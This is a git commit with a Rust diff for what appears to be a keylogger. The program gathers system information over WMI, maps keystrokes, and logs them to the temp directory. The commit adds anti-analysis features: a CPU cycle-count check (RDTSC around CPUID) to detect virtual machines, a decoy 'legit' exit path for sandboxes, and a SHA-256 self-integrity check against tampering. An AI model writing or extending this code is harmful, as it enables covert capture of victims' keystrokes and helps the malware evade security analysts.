4f92e3707f78ebde8d795aa81a00af7c0aba05d5
poledna0 <henriquepoledna@proton.me>
2026-04-23 15:17:09 -0300

    feat: add de contagem de ciclos de cpu para identifciar se esta dentro da vm

--- src/main.rs
+++ src/main.rs
@@ -7,9 +7,11 @@ use std::fs::File;
 use std::collections::HashMap;
 use wmi::{COMLibrary, WMIConnection, WMIResult, Variant};
 use sha2::{Sha256, Digest};
+use core::arch::x86_64::{__cpuid, _rdtsc};
+
 
 // precisa mudar dps para o hash da func depois de pronta
-const EXPECTED: [u8;32] = [0x34,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56];
+const EXPECTED: [u8;32] = [0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56,0x56];
 
 // macro de erro
 macro_rules! error {
@@ -17,7 +19,7 @@ macro_rules! error {
         println!("[!] {}", format!($msg,$($arg),*))
     };
 }
-
+// ainda vou fazer um codigo caso esteja em uma vm, para rodar uma coisa legit
 fn legit(){std::process::exit(1)}
 
 fn info_basica(file: &mut File){
@@ -26,11 +28,12 @@ fn info_basica(file: &mut File){
         let info = os_info::get();
         format!("OS: {}\nVerssão: {}\n", info.os_type(), info.version())
     };
+
     log(file, info_so);
+
     let hostname_wrap = hostname::get();
-    if hostname_wrap.is_ok(){
-        log(file, format!("Hostname: {:?}\n",hostname_wrap.unwrap()))
-    }
+
+    if hostname_wrap.is_ok(){log(file, format!("Hostname: {:?}\n",hostname_wrap.unwrap()))}
     
     else {log(file, format!("Hostname: Erro"));}
 
@@ -52,26 +55,48 @@ fn log(file: &mut File, s:String){
 // isso não executa a função.
 // isso recebe o endereço dela.
 fn get_fn_addr(f: fn()) -> usize {
+    // ponteiro -> número inteiro
     f as usize
 }
 
+fn ciclos() -> u64 {
+    // registrador chamado TSC (Time Stamp Counter)
+    unsafe { _rdtsc() }
+}
+
+fn calcula_ciclos() -> u64 {
+    let start = ciclos();
+    __cpuid(0); // pergunta info da CPU    
+    let end = ciclos();
+    end - start
+}
+
 fn hash_protected_region() -> Vec<u8> {
+    // as fn() é dizer para tratar essa função como um ponteiro de função simples
     let start = get_fn_addr(integrity_start as fn());
     let end   = get_fn_addr(integrity_end as fn());
 
     let size = end - start;
 
+    // start tem um numero, q é o endereco da func inicial, q esta em numero, e a gente muda para ponteiro dnv, e ate o tamanho q tem o size, para saber quanto ele 
+    // tem q andar 
+    // ent aq temos um vec, slice de um ponteiro inicial até o tamanho q passei, ent temos os by em MM 
+    // e dps vms tirar hash para saber se alg mudou alg coisa
     let bytes = unsafe {
         std::slice::from_raw_parts(start as *const u8, size)
     };
 
+    // intancia...
     let mut hasher = Sha256::new();
     hasher.update(bytes);
-    hasher.finalize().to_vec()
+    let hash = hasher.finalize().to_vec(); 
+    println!("{:?}",&hash);
+    hash
 }
-
+//Impede o compilador de, remover, mover
 #[inline(never)]
-#[unsafe(no_mangle)] // garante que o símbolo exista no binário.
+//Impede renomeação do símbolo, garante que exista endereço fixo na .text
+#[unsafe(no_mangle)]
 pub fn integrity_start() {}
 
 #[inline(never)]
@@ -102,7 +127,6 @@ fn verify_function_integrity() {
         legit();
     }
 }
-
 
 fn key_notes(k: u8, is_shift_or_caps: bool)-> String{
      match k {
@@ -414,10 +438,6 @@ fn key_notes(k: u8, is_shift_or_caps: bool)-> String{
 }
 
 fn main() {
-
-    // temporario para pegar o hash oficial das func :)
-    //let h = hash_protected_region();
-    //println!("{:x?}", h);
 
     
     let temp_path = std::env::temp_dir();
